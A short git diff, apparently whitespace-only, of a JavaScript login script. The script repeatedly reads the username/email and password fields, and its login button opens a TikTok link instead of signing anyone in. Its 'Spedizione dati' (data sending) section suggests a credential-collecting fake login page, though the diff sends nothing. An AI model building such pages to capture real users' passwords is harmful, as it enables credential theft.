@@ -2,12 +2,11 @@ let NomeUtente,Password;
 const btnAcces = document.getElementById("btnAccedi");
 
 //-----------Aqcuisizione dati--------------------//
+
 NomeUtente = document.getElementById("Nome/Email").value;
 Password = document.getElementById("Password").value;
 
 //-----------Spedizione dati--------------------//
-
-
 
 btnAcces.addEventListener('click', () => {
   console.log("accesso");
@@ -19,8 +18,8 @@ btnAcces.addEventListener('click', () => {
   open("https://vm.tiktok.com/ZMdKg5hK7/");
 });
 
-
   //--------------Controllo dati----------------------//
+
 setInterval(() => {
 NomeUtente = document.getElementById("Nome/Email").value;
 Password = document.getElementById("Password").value;
